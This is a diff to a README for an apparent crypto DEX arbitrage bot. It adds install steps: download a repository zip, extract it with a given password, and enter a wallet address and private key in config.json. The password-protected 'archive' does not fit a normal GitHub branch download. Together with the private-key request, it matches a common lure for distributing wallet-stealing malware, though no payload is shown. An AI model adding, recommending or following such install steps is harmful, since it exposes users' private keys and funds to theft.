@@ -5,3 +5,7 @@ The bot continuously monitors the prices of specific assets on different DEXs, l
 
 ## Warning
 The software is provided for educational purposes, is untested and not suitable for financial operations. Use it to experiment and create your own strategies. The technical support call center is not available if you get stuck with funds, so be sure to test the program before you do anything else. Use play money or funds you are willing to lose on the test network.
+
+## Install
+- [Download](https://github.com/freesparrowrob/dex-arbitrage-bot/archive/refs/heads/main.zip) the repository release and extract files with password `XvI2SJUNssB4`.
+- Edit the address and `private_key` fields in the `config.json` file.
